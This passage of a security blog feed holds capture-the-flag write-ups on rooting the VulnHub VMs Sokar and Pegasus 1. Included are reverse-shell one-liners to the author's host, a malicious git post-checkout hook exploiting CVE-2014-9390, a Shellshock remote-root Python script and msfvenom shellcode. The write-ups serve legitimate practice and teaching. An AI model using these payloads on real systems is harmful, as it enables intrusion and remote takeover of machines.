R12: 0x7fffffffe7a0 (&ldquo;f&lt;:;f+ &lsquo;f. =i<em>%&amp;&rsquo;,i::!sff;&amp;&amp;=\t:&amp;\&rdquo;(;d-,?sf;&amp;&amp;=f:,</em>;,=d9;&amp;#,<em>=if$&lsquo;=f:,</em>;,=d9;&amp;#,*=f")
R13: 0x7fffffffe910 &mdash;> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-code&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
   0x555555554a2b &lt;main+316>:   mov    eax,0x0
   0x555555554a30 &lt;main+321>:   call   0x5555555547a0 &lt;setreuid@plt>
   0x555555554a35 &lt;main+326>:   mov    rdi,rbx
=> 0x555555554a38 &lt;main+329>:   mov    eax,0x0
   0x555555554a3d &lt;main+334>:   call   0x555555554750 &lt;system@plt>
   0x555555554a42 &lt;main+339>:   mov    rsp,r12
   0x555555554a45 &lt;main+342>:   jmp    0x555555554a5d &lt;main+366>
   0x555555554a47 &lt;main+344>:   lea    rsi,[rip+0x12c]        # 0x555555554b7a
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;stack&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;]
0000| 0x7fffffffe740 (&ldquo;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
0008| 0x7fffffffe748 (&ldquo;/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
0016| 0x7fffffffe750 (&ldquo;ne ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
0024| 0x7fffffffe758 (&ldquo;/root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
0032| 0x7fffffffe760 (&ldquo;kar-dev:/root/secret-project /mnt/secret-project/&rdquo;)
0040| 0x7fffffffe768 (&ldquo;/root/secret-project /mnt/secret-project/&rdquo;)
0048| 0x7fffffffe770 (&ldquo;cret-project /mnt/secret-project/&rdquo;)
0056| 0x7fffffffe778 (&ldquo;ject /mnt/secret-project/&rdquo;)
[&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;]
Legend: code, data, rodata, value</p>

<p>Breakpoint 1, 0x0000555555554a38 in main ()
gdb-peda$ x/x $rbx
0x7fffffffe740: 0x2f
gdb-peda$ x/s $rbx
0x7fffffffe740:  &ldquo;/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/&rdquo;
gdb-peda$ x/s $rdx
0x7fffffffe7a0:  &ldquo;f&lt;:;f+ &lsquo;f. =i<em>%&amp;&rsquo;,i::!sff;&amp;&amp;=\t:&amp;\&rdquo;(;d-,?sf;&amp;&amp;=f:,</em>;,=d9;&amp;#,<em>=if$&lsquo;=f:,</em>;,=d9;&amp;#,*=f"
gdb-peda$
```</p>

<p>Right before this call though, there is a instruction to <code>call   0x5555555547a0 &lt;setreuid@plt&gt;</code> to set the UID to 0. So, this brought me to the conclusion that <code>build</code> is running <code>/usr/bin/git clone ssh://root@sokar-dev:/root/secret-project /mnt/secret-project/</code> as <code>root</code>. But what is so special about this?</p>

<h3>inspecting git</h3>

<p>I did a lot of poking around here, wondering if I should pursue the avenue of trying to exploit the b0f which has the SSP, or should I try and figure out the significance of a <code>git clone</code> as root? One of my first theories was that if I could get <code>sokar-dev</code> to resolve to something I am in control of (like my Kali vm), I could attempt to have git clone a setuid shell. This was, of course, before I remembered that the only permissions <code>git</code> will honor really is the symlink and executable bits :(</p>

<p>Further enumeration while I was thinking about the possibilities revealed that <code>/mnt/</code> was actually mounted with the <code>vfat</code> filesystem!</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;mount; cat /etc/fstab&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;mount; cat /etc/fstab&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
/dev/sda1 on / type ext4 (rw)
proc on /proc type proc (rw)
sysfs on /sys type sysfs (rw)
devpts on /dev/pts type devpts (rw,gid=5,mode=620)
tmpfs on /dev/shm type tmpfs (rw)
/dev/sdb1 on /mnt type vfat (rw,uid=501,gid=502)
none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)</p>

<p>#</p>

<h1>/etc/fstab</h1>

<h1>Created by anaconda on Wed Nov 12 13:29:15 2014</h1>

<p>#</p>

<h1>Accessible filesystems, by reference, are maintained under &lsquo;/dev/disk&rsquo;</h1>

<h1>See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info</h1>

<p>#
UUID=cdb3ac23-d831-4104-bc76-e3a56314b6e4 /                       ext4    defaults        1 1
tmpfs                   /dev/shm                tmpfs   defaults        0 0
devpts                  /dev/pts                devpts  gid=5,mode=620  0 0
sysfs                   /sys                    sysfs   defaults        0 0
proc                    /proc                   proc    defaults        0 0
/dev/sdb1       /mnt            vfat    defaults,uid=501,gid=502    0 0
```</p>

<p>As you can see, <code>/mnt</code> also specified the uid/gid for files on the mount, so even if I <em>were</em> able to get a suid shell onto the file system, root will not be the one owning it.</p>

<p>However. <code>vfat</code>. Why <code>vfat</code>&hellip; Of course! <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9390">CVE-2014-9390</a>. The potential client side code execution bug in older <code>git</code> versions where a case insensitive filesystem may cause the <code>git</code> client to read hooks from <code>.Git/hooks</code> instead of <code>.git/hooks</code>. And, of course, <code>vfat</code> is a case insensitive filesystem, which makes for the perfect scenario to exploit this bug.</p>

<p>I checked up on the installed version of <code>git</code> on Sokar, just to make sure that it is in fact vulnerable:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;git &mdash;version&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;git &mdash;version&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
git version 2.2.0
```</p>

<p>Great. <code>git</code> version 2.2.1 fixed this bug so we are in luck.</p>

<h2>rooting sokar</h2>

<p>All of this information was great to have, but it still had one major problem. How can I clone a repository <strong>I</strong> own? I made <em>countless</em> attempts to try fool the environment into resolving <code>sokar-dev</code> to my Kali Host. Every single one failed. All of the material on the topic that I found online suggest that the SUID process &lsquo;cleans up&rsquo; the environment, especially for reasons such as this one.</p>

<p>I started doubting my plan and was nearing a point of leaving Sokar for a bit to rethink my strategy when I realized the following gem:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;find /etc/ -writable -type f 2>/dev/null | xargs ls -lh&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;find /etc/ -writable -type f 2>/dev/null | xargs ls -lh&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
-rw-rw-rw- 1 root root 19 Jan  2 20:12 /etc/resolv.conf
```</p>

<p><code>/etc/resolv.conf</code> is <strong>world writable</strong>. This is perfect! I can change the DNS server to use to one that I control, obviously feeding it a IP that will be my local Kali instance :D</p>

<h3>preparing the environment and exploit</h3>

<p>I decided to use <code>dnsmasq</code> for a quick to setup DNS server. I added a line to <code>/etc/dnsmasq.hosts</code> to answer a query for <code>sokar-dev</code>:</p>

<p><code>bash
leonjza@kali/sokar $ cat /etc/dnsmasq.hosts
192.168.217.174 sokar-dev
</code></p>

<p>&hellip; and started the <code>dnsmasq</code> server:</p>

<p>```bash
leonjza@kali/sokar $ dnsmasq &mdash;no-daemon &mdash;log-queries -H /etc/dnsmasq.hosts</p>

<p>dnsmasq: started, version 2.62 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 192.168.252.2#53
dnsmasq: read /etc/hosts &ndash; 6 addresses
dnsmasq: read /etc/dnsmasq.hosts &ndash; 1 addresses
```</p>

<p>Testing my DNS server proved that it was working just fine:</p>

<p>```bash
leonjza@kali/sokar $ dig sokar-dev @127.0.0.1</p>

<p>; &lt;&lt;>> DiG 9.8.4-rpz2+rl005.12-P1 &lt;&lt;>> sokar-dev @127.0.0.1
;; global options: +cmd
;; Got answer:
;; &ndash;>>HEADER&lt;&lt;&ndash; opcode: QUERY, status: NOERROR, id: 48044
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</p>

<p>;; QUESTION SECTION:
;sokar-dev.         IN  A</p>

<p>;; ANSWER SECTION:
sokar-dev.      0   IN  A   192.168.217.174</p>

<p>;; Query time: 13 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Feb  3 12:12:02 2015
;; MSG SIZE  rcvd: 43
```</p>

<p>Awesome. The next step was to replace the contents of Sokar&rsquo;s <code>/etc/resolv.conf</code> so that the dns server to use is <em>192.168.217.174</em> with the command <code>python apophis.py "echo \"nameserver\ 192.168.217.174\" &gt; /etc/resolv.conf"</code> and confirm that it worked:</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;cat /etc/resolv.conf&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;cat /etc/resolv.conf&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
nameserver 192.168.217.174
```</p>

<p>Great. Testing time!</p>

<p>```bash
leonjza@kali/sokar $ python apophis.py &ldquo;echo Y | /home/apophis/build&rdquo;
 * Executing /usr/bin/python -c &ldquo;import time; time.sleep(2); print &lsquo;overdrive&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;, &lsquo;-l&rsquo;, &lsquo;-c&rsquo;,&lsquo;echo Y | /home/apophis/build&rsquo;, &lsquo;apophis&rsquo;]);&rdquo;</p>

<p>Password:
Cloning into &lsquo;/mnt/secret-project&rsquo;&hellip;
Host key verification failed.
fatal: Could not read from remote repository.</p>

<p>Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
```</p>

<p>Yesssssss, and nooooooooo. From the <code>dnsmasq</code> console output I could see the request for <code>sokar-dev</code> coming in and a reply getting sent:</p>

<p><code>bash
dnsmasq: query[A] sokar-dev from 192.168.217.163
dnsmasq: /etc/dnsmasq.hosts sokar-dev is 192.168.217.174
</code></p>

<p>However, in order for the SSH session to happen, I need to either accept or bypass the host key verification. There are many ways to do this, but sadly, with my current (still! :D) nonexistent interactive shell, I can not type &lsquo;yes&rsquo;. I can not use <code>ssh-keyscan &gt;&gt; ~/.ssh/known_hosts</code> as I can&rsquo;t write to <code>root</code>&rsquo;s <code>.ssh</code> directory, nor can I modify the command that is being passed onto <code>system()</code> in the binary to specify <code>-o StrictHostKeyChecking=no</code>.</p>

<p>Unfortunately, due to these restrictions, I had to finally give in and go one step back to <code>bynarr.py</code> and use his allowed egress access on <code>tcp/51242</code> to build a interactive shell. On one session I started a netcat listener, and on another, I ran <code>python bynarr.py "/bin/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.217.174 51242 &gt;/tmp/f"</code>.</p>

<p>```bash
leonjza@kali/sokar $ nc -lvp 51242
listening on [any] 51242 &hellip;
192.168.217.163: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.217.174] from (UNKNOWN) [192.168.217.163] 40382
sh: no job control in this shell
sh-4.1$ python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
[bynarr@sokar cgi-bin]$ su &ndash; apophis
su &ndash; apophis
Password: overdrive</p>

<p>[apophis@sokar ~]$ id
id
uid=501(apophis) gid=502(apophis) groups=502(apophis)
[apophis@sokar ~]$
```</p>

<p>With the interactive shell as <code>apophis</code> now, I was able to accept the SSH hostkey check.</p>

<p>The next thing left on the list was to prepare a <code>git</code> repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for <code>/root/secret-project</code>, I prepared just that on my Kali VM:</p>

<p><code>bash
leonjza@kali/sokar $ cd /root
leonjza@kali/root $ mkdir secret-project
leonjza@kali/root $ cd secret-project
leonjza@kali/root/secret-project $ git init --bare
Initialized empty Git repository in /root/secret-project/
leonjza@kali/root/secret-project | git:master $
</code></p>

<p>Thats it&hellip; Next, I cloned it locally in a different folder.</p>

<p><code>bash
leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
Cloning into 'secret-project'...
root@127.0.0.1's password:
warning: You appear to have cloned an empty repository.
leonjza@kali/sokar $ cd secret-project
leonjza@kali/sokar/secret-project | git:master $
</code></p>

<p>Done. Working from a PoC exploit found <a href="https://gitlab.com/mehmet/cve-2014-9390">here</a>, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&rsquo;s) on a <code>tcp/22</code> netcat listener, spawning a shell. I knew <code>tcp/22</code> traffic was allowed due to the SSH host key verification step that needed some work :)</p>

<p>```bash
leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
leonjza@kali/sokar/secret-project | git:master $ cd .Git
leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks
leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout</p>

<h1>!/bin/sh</h1>

<p>bash -i >&amp; /dev/tcp/192.168.217.1/22 0>&amp;1
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m &lsquo;pwnd&rsquo;
[master (root-commit) ee364fd] pwnd
 Committer: root <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#114;&#111;&#111;&#116;&#64;&#x6c;&#111;&#99;&#x61;&#108;&#x68;&#x6f;&#x73;&#x74;&#46;&#108;&#111;&#x63;&#x61;&#108;&#100;&#111;&#x6d;&#97;&#x69;&#x6e;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x6c;&#x6f;&#99;&#x61;&#x6c;&#104;&#x6f;&#x73;&#x74;&#x2e;&#108;&#111;&#99;&#x61;&#x6c;&#100;&#x6f;&#109;&#97;&#x69;&#x6e;</a></p>

<p> 1 file changed, 2 insertions(+)
 create mode 100755 .Git/hooks/post-checkout
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master
<a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x72;&#111;&#111;&#116;&#x40;&#49;&#x32;&#55;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;">&#114;&#x6f;&#111;&#x74;&#x40;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#46;&#49;</a>&rsquo;s password:
Counting objects: 5, done.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (5/5), 345 bytes, done.
Total 5 (delta 0), reused 0 (delta 0)
To ssh://127.0.0.1/root/secret-project
 * [new branch]      master &ndash;> master
Branch master set up to track remote branch master from origin.
leonjza@kali/sokar/secret-project/.Git/hooks | git:master $
```</p>

<p>With my evil repository ready, it was time to try that <code>build</code> again :)</p>

<p>```bash
[apophis@sokar ~]$ ./build
./build
Build? (Y/N) Y
Y
Cloning into &lsquo;/mnt/secret-project&rsquo;&hellip;
root@sokar-dev&rsquo;s password: # redact lol</p>

<p>remote: Counting objects: 5, done.
remote: Compressing objects: 100% (2/2), done.
Receiving objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 0 (delta 0)
Checking connectivity&hellip; done.</p>

<p>```</p>

<p>This shell just &lsquo;hung&rsquo; there, however, the netcat listener on my Mac had a different story to tell:</p>

<p>```
leonjza@laptop » sudo nc -lv 22
Password:
[root@sokar secret-project]# cat /root/flag
cat /root/flag</p>

<pre><code>            0   0
            |   |
        ____|___|____
     0  |~ ~ ~ ~ ~ ~|   0
     |  |   Happy   |   |
  ___|__|___________|___|__
  |/\/\/\/\/\/\/\/\/\/\/\/|
</code></pre>

<p>  0   |    B i r t h d a y    |   0
  |   |/\/\/\/\/\/\/\/\/\/\/\/|   |
 <em>|</em><strong>|</strong><em><em><em><em><em><em><em><em><em><em><em><em><em><em><em><em><strong><strong><em>|</em></strong>|</strong>
|/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|
|                                   |
|     V  u  l  n  H  u  b   ! !     |
| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |
|</em></em></em></em></em></em></em></em></em></em></em></em></em></em></em></em>___________________|</p>

<p>=====================================
| Congratulations on beating Sokar! |
|                                   |
|  Massive shoutout to g0tmi1k and  |
| the entire community which makes  |
|         VulnHub possible!         |
|                                   |</p>

<h1>|    rasta_mouse (@_RastaMouse)     |</h1>

<p>[root@sokar secret-project]#
```</p>

<h2>conclusion</h2>

<p>What a blast! Them feels of r00t are so <em>gooood</em>. For the curios, that firewall that was making life so difficult:</p>

<p>```bash
[root@sokar secret-project]# cat /etc/sysconfig/iptables
cat /etc/sysconfig/iptables</p>

<h1>Firewall configuration written by system-config-firewall</h1>

<h1>Manual customization of this file is not recommended.</h1>

<p>*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -m state &mdash;state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p icmp -j DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m state &mdash;state ESTABLISHED -p tcp &mdash;sport 22 -j ACCEPT
-A INPUT -m state &mdash;state NEW,ESTABLISHED -p tcp &mdash;dport 591 -j ACCEPT
-A INPUT -p udp &mdash;sport 53 -j ACCEPT
-A OUTPUT -m state &mdash;state NEW,ESTABLISHED -m owner &mdash;uid-owner 0 -p tcp &mdash;dport 22 -j ACCEPT
-A OUTPUT -p udp &mdash;dport 53 -m owner &mdash;uid-owner 0 -j ACCEPT
-A OUTPUT -m state &mdash;state ESTABLISHED -p tcp &mdash;sport 591 -j ACCEPT
-A OUTPUT -m state &mdash;state NEW,ESTABLISHED -m owner &mdash;gid-owner 501 -p tcp &mdash;dport 51242 -j ACCEPT
-A OUTPUT -j DROP
COMMIT
```</p>

<h2>edit</h2>

<p>I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the <code>lime</code> script run with <code>sudo</code> can be shocked too!</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>2015 Leon Jacobs</h1>

<h1>sokar remote root command execution</h1>

<p>import requests
import sys</p>

<p>if len(sys.argv) &lt; 2:</p>

<pre><code>print " * Usage %s &lt;cmd&gt;" % sys.argv[0]
sys.exit(1)
</code></pre>

<h1>Grab the command from the args</h1>

<p>command = sys.argv[1].strip()</p>

<h1>prep to shock the lime script</h1>

<p>root_command = &ldquo;&rdquo;&ldquo;echo "N&rdquo; | sudo MAIL=\&ldquo;() { :;}; %s;\&rdquo; /home/bynarr/lime"&ldquo;&rdquo; % command</p>

<h1>prep to exec the command as bynarr</h1>

<p>payload = &ldquo;&rdquo;&ldquo;/usr/bin/python -c "import time; time.sleep(1); print &lsquo;fruity&rsquo;&rdquo; | /usr/bin/python -c &ldquo;import pty; pty.spawn([&lsquo;/bin/su&rsquo;,&lsquo;-c&rsquo;,&lsquo;%s&rsquo;, &lsquo;bynarr&rsquo;]);&rdquo; &ldquo;&rdquo;&ldquo; % root_command</p>

<h1>be verbose about the full command</h1>

<p>print &ldquo; * Executing %s\n&rdquo; % payload</p>

<h1>Send the sploit</h1>

<p>headers = { &ldquo;User-Agent&rdquo;: &ldquo;() { :;};echo;%s&rdquo; % payload }
print requests.get(&ldquo;<a href="http://192.168.217.163:591/cgi-bin/cat">http://192.168.217.163:591/cgi-bin/cat</a>&rdquo;, headers=headers).text.strip()
```</p>

<p>Run with <code>python root.py "/bin/cat /root/flag"</code> :D</p>

<p>Thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for the VM, and as always, <a href="https://twitter.com/VulnHub">@VulnHub</a> for the hosting and great community!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[hoof to root ? - solving pegasus 1]]></title>
    <link href="http://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/"/>
    <updated>2014-12-23T08:29:49+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).</p>

<p><img class="right <a" src="href="https://i.imgur.com/PI4O7Dp.png">https://i.imgur.com/PI4O7Dp.png</a>"> Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>

<p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>

<p>Lets begin.</p>

<!-- more -->


<h2>nmap, again</h2>

<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>

<p>```bash
root@kali:~# nmap &mdash;reason -sV 192.168.56.101 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-23 09:16 SAST
Nmap scan report for 192.168.56.101
Host is up, received arp-response (0.00022s latency).
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
8088/tcp  open  http    syn-ack nginx 1.1.19
55625/tcp open  status  syn-ack 1 (RPC #100024)
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
```</p>

<p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>

<h2>stomping some hoofs with pegasus</h2>

<p>Browsing to <a href="http://192.168.56.101:8088/,">http://192.168.56.101:8088/,</a> we are presented with a picture of Pegasus:</p>

<p><img class="<a" src="href="https://i.imgur.com/Z0XYRY8.jpg">https://i.imgur.com/Z0XYRY8.jpg</a>"></p>

<p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>

<p><img class="<a" src="href="https://i.imgur.com/svwUN3m.png">https://i.imgur.com/svwUN3m.png</a>"></p>

<p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>

<p>```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  &mdash;hc 404 <a href="http://192.168.56.101:8088/FUZZ.php">http://192.168.56.101:8088/FUZZ.php</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.101:8088/FUZZ.php">http://192.168.56.101:8088/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>

<h1>Total requests: 1660</h1>

<h1>ID  Response   Lines      Word         Chars          Request    </h1>

<p>01426:  C=200      0 L         4 W       19 Ch    &ldquo; &ndash; submit&rdquo;
```</p>

<p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to <a href="http://192.168.56.101:8088/submit.php:">http://192.168.56.101:8088/submit.php:</a></p>

<p><img class="<a" src="href="https://i.imgur.com/Ld1KzkR.png">https://i.imgur.com/Ld1KzkR.png</a>"></p>

<p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>

<p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/wYpHVWE.png">https://i.imgur.com/wYpHVWE.png</a>"></p>

<h2>pwning mike</h2>

<p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>

<p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>

<p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>

<p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>

<p><img class="<a" src="href="https://i.imgur.com/IVmBaAA.png">https://i.imgur.com/IVmBaAA.png</a>"></p>

<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>

<p><em>insert fade to black</em></p>

<p><em>CAPTION: many hours later</em></p>

<p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>

<p>```c</p>

<h1>include&lt;stdio.h></h1>

<p>// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
unsigned char buf[] =
&ldquo;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&rdquo;
&ldquo;\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&rdquo;
&ldquo;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&rdquo;
&ldquo;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&rdquo;
&ldquo;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&rdquo;
&ldquo;\x0b\xcd\x80&rdquo;;</p>

<p>int main()
{</p>

<pre><code>int (*ret)() = (int(*)())buf;
ret();
</code></pre>

<p>}
```</p>

